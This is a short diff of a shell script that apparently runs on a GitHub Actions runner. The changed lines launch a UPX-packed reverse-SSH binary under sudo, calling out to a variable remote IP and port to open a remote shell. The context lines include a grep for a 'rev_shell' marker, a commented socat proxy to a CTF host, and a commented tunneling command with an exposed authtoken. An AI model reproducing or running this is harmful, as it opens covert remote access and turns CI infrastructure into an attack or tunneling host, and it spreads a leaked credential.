@@ -4,6 +4,7 @@
 #/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &
 
 
+export HOME=/tmp;
 
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
@@ -54,8 +55,7 @@ else
   if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then 
     #sudo chmod 0777 $GITHUB_WORKSPACE/natapp;
  #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
-   sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5; 
-#else sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p 60021 cn-bj-plc-300.openfrp.cc ;
+   sudo sh -c "export HOME=/tmp;alias ll=\"ls -al\";$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
   fi
 
 fi
